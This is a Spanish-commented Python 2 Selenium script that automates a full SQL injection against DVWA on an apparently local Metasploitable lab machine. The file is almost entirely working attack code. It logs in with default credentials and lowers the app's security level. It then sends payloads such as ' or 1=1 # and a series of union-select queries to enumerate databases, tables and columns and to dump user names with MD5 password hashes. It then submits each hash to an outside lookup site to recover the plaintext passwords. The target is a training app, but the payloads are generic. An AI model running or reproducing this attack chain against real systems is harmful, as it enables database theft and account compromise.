# -*- coding: utf-8 -*-
# Autor: @kr1shn4murt1
# Fecha: Julio 11 2017
# Este script se loguea a DVWA y explota la vulnerabilidad SQLi

# Loguearse a DVWA

########################## Inicia Login  ####################

import time
from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

url_Metasploitable= 'http://192.168.40.142/'
browser= webdriver.Firefox()
browser.get(url_Metasploitable)

# Link DVWA /x:html/x:body/x:ul/x:li[4]/x:a -- filtrado # /html/body/ul/li[4]/a
a= browser.find_elements_by_xpath('/html/body/ul/li[4]/a')

# Darle click al link de DVWA
a[0].click()

# Condicion que espera que los campos de login sean visibles
a = WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, "/html/body/div/form/fieldset/input[1]")))

# Se declara el punto de entrada de usuario, 
# tambien se puede usar el xpath anterior para declarar el elemento
campo_User= browser.find_element_by_name('username')
# Se declara el punto de entrada de password
campo_Password= browser.find_element_by_name('password')

# Se llena el campo usuario con la palabra admin
campo_User.send_keys("admin")
# Se llena el campo password con la palabra password
campo_Password.send_keys("password")

# Se declara el cuadro de login para darle click  mas abajo
a= browser.find_elements_by_xpath('/html/body/div/form/fieldset/p/input')

# Darle click al link de login
a[0].click()

####################### Termina login #####################

######## Inicia Poner el nivel de seguridad en low ########

# Condicion para esperar que sea visible el menu de security
a = WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, "id('main_menu_padded')/ul[3]/li[1]/a")))

# Link de dvwa security 
a= browser.find_elements_by_xpath("id('main_menu_padded')/ul[3]/li[1]/a")
a[0].click()

# Condicion para esperar que sea visible la opcion de security low
#a = WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, "id('main_body')/div/form/select/option[1]")))

time.sleep(2)

# Opcion de dvwa security low
a= browser.find_elements_by_xpath("id('main_body')/div/form/select/option[1]")
a[0].click()

# Click a submit para que quede security en low
a= browser.find_elements_by_xpath("id('main_body')/div/form/input")
a[0].click()

######## Termina Poner el nivel de seguridad en low ########


################ Inicio Explotacion de SQL injection ##############

# Click a menu SQL injection
a= browser.find_elements_by_xpath("id('main_menu_padded')/ul[2]/li[5]/a")
a[0].click()

# Enviar un 1 en el campo ID
#a = WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, "id('main_body')/div/div/form/input[1]")))
time.sleep(2)
campo_ID= browser.find_element_by_xpath("id('main_body')/div/div/form/input[1]")
campo_ID.send_keys("1")
# Aqui se usa element singular, y mas abajo a.click() en vez de a[0].click()
a= browser.find_element_by_xpath("id('main_body')/div/div/form/input[2]")
a.click()

# Obtener el codigo fuente de la pagina para ver el resultado de lo enviado
# fuente = browser.page_source
# print fuente

# Parte del html donde se imprime el resultado del id enviado
"""
ID: 1
First name: admin
Surname: admin
"""
#WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, "id('main_body')/div/div/pre")))
#a= browser.find_element_by_xpath("id('main_body')/div/div/pre")

time.sleep(2)

#print a.text

# Disparar error de mysql enviando comilla simple
campo_ID= browser.find_element_by_xpath("id('main_body')/div/div/form/input[1]")
campo_ID.send_keys("'")
# Aqui se usa element singular, y mas abajo a.click() en vez de a[0].click()
a= browser.find_element_by_xpath("id('main_body')/div/div/form/input[2]")
a.click()

# Imprimir error que entrega la pagina, al imprimir fuente esta entregando 
# el viejo, no el fuente del error
#a = WebDriverWait(browser, 5).until(EC.element_to_be_clickable((By.XPATH, "/html")))
#print a.text

# Devolverse una pagina para volver a enviar la secuencia de exlotacion
# de SQLi
browser.back()

# Ir hacia adelante una pagina
#browser.forward()

# Enviar ' or 1=1 # para que el app devuelva todos los usuarios
campo_ID= browser.find_element_by_xpath("id('main_body')/div/div/form/input[1]")

campo_ID.send_keys("' or 1=1 #")
# Aqui se usa element singular, y mas abajo a.click() en vez de a[0].click()
a= browser.find_element_by_xpath("id('main_body')/div/div/form/input[2]")
a.click()

#a = WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, "id('main_body')/div/div/pre")))

time.sleep(2)

# Se obtiene el array a que contiene los valores de usuario
a= browser.find_elements_by_xpath("id('main_body')/div/div/pre")

# De cada elemento en el array se imprime el texto: ID: 1' or 1=1 #
"""First name: Gordon
Surname: Brown"""
print "Usuarios de la base de datos:"
for i in a:
	print i.text
print "\n"

# Obtener la url actual
# browser.current_url

# A partir de aqui usar la url para la explotacion
# Empezar a revelar el numero de columnas ' order by 1#
browser.get("http://192.168.40.142/dvwa/vulnerabilities/sqli/?id=%27+order+by+1+%23&Submit=Submit#")

browser.get("http://192.168.40.142/dvwa/vulnerabilities/sqli/?id=%27+order+by+2+%23&Submit=Submit#")

# Se obtiene el error de mysql con ' order by 1#, la consulta usa dos
# columnas
browser.get("http://192.168.40.142/dvwa/vulnerabilities/sqli/?id=%27+order+by+3+%23&Submit=Submit#")

#Se muestran los numeros 1 2 , se sabe que se esta inyectando y donde
# ' union all select 1,2 #
browser.get("http://192.168.40.142/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+1,2%23&Submit=Submit#")

# Se obtiene el nombre del usuario y la base de datos del app web
# ' union all select user(),database() #
browser.get("http://192.168.40.142/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user(),database()%23&Submit=Submit#")

browser.refresh()

browser.get("http://192.168.40.142/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+user(),database()%23&Submit=Submit#")

# b= WebDriverWait(browser, 20).until(EC.element_to_be_clickable((By.XPATH, "id('main_body')/div/div/pre")))

time.sleep(2)

# Se obtiene el array a que contiene los valores de user y database
b= browser.find_elements_by_xpath("id('main_body')/div/div/pre")

# De cada elemento en el array se imprime el texto:

print "Usuario de conexion a la BD y nombre BD"
for j in b:
	print j.text
print "\n"

# Devuelve las bases de datos creadas, alli se muestra la base de datos DVWA
# ' union all SELECT schema_name,2 FROM information_schema.schemata #
time.sleep(2)
browser.get("http://192.168.40.142/dvwa/vulnerabilities/sqli/?id=%27+union+all+select+schema_name,2+FROM+information_schema.schemata%23&Submit=Submit#")

time.sleep(1)
# Se obtiene el array a que contiene los valores de bases de datos
b= browser.find_elements_by_xpath("id('main_body')/div/div/pre")

# De cada elemento en el array se imprime el texto:

print "Bases de datos presentes en el servidor"
for j in b:
	print j.text
print "\n"

#Se listan las tablas de esa base de datos, se muestra guestbook y users
#' union all SELECT table_schema,table_name FROM information_schema.tables where table_schema = 'dvwa' #
time.sleep(2)
browser.get("http://192.168.40.142/dvwa/vulnerabilities/sqli/?id=%27+union+all+SELECT+table_schema%2Ctable_name+FROM+information_schema.tables+where+table_schema+%3D+%27dvwa%27+%23&Submit=Submit#")

time.sleep(1)
# Se obtiene el array a que contiene las tablas de dvwa
b= browser.find_elements_by_xpath("id('main_body')/div/div/pre")

# De cada elemento en el array se imprime el texto:

print "Tablas de la BD dvwa: "
for j in b:
	print j.text
print "\n"

# Listando las tablas y columnas de la base de datos dvwa, muestra columnas user y password
# ' union all SELECT table_name,column_name FROM information_schema.columns WHERE table_schema = 'dvwa' #
time.sleep(2)
browser.get("http://192.168.40.142/dvwa/vulnerabilities/sqli/?id=%27+union+all+SELECT+table_name%2Ccolumn_name+FROM+information_schema.columns+WHERE+table_schema+%3D+%27dvwa%27+%23&Submit=Submit#")

time.sleep(1)
# Se obtiene el array a que contiene las columnas de la tabla users
b= browser.find_elements_by_xpath("id('main_body')/div/div/pre")

# De cada elemento en el array se imprime el texto:

print "Columnas de la tabla dvwa.users: "
for j in b:
	print j.text
print "\n"

# Lista todos los usuarios y sus contrasenhas hasheadas en md5.
# ' union all SELECT user, password FROM users #
time.sleep(2)
browser.get("http://192.168.40.142/dvwa/vulnerabilities/sqli/?id=%27+union+all+SELECT+user%2C+password+FROM+users+%23&Submit=Submit#")

time.sleep(1)
# Se obtiene el array a que contiene los valores de bases de datos
b= browser.find_elements_by_xpath("id('main_body')/div/div/pre")

# De cada elemento en el array se imprime el texto:

print "Nombres de usuarios y hashes: "
for j in b:
	print j.text
print "\n"

array_Hashes= []

for j in b:
    tupla= j.text.split(':')[2].split('\n')[0] + ':' +j.text.split(':')[3].strip()
    array_Hashes.append(tupla)
print "\n"

# Logout de dvwa
b= browser.find_element_by_xpath("id('main_menu_padded')/ul[4]/li/a")
b.click()

################ Fin Explotacion de SQL injection ##############

############ Inicio encontrar texto plano de hashes ############

# print array_Hashes

# Obtener el texto plano enviando el hash a la web
# https://md5.gromweb.com/?md5=5f4dcc3b5aa765d61d8327deb882cf99

for i in range(len(array_Hashes)):
    browser.get("https://md5.gromweb.com/?md5="+array_Hashes[i].split(':')[1])
    time.sleep(1)
    c= browser.find_element_by_xpath("id('content')/p[1]/em[2]")
    array_Hashes[i]= array_Hashes[i]+':'+c.text

print "Hashes y texto plano de los hashes: "

print array_Hashes
print "\n"

#browser.get()

############ Fin encontrar texto plano de hashes ############


# browser.quit()









































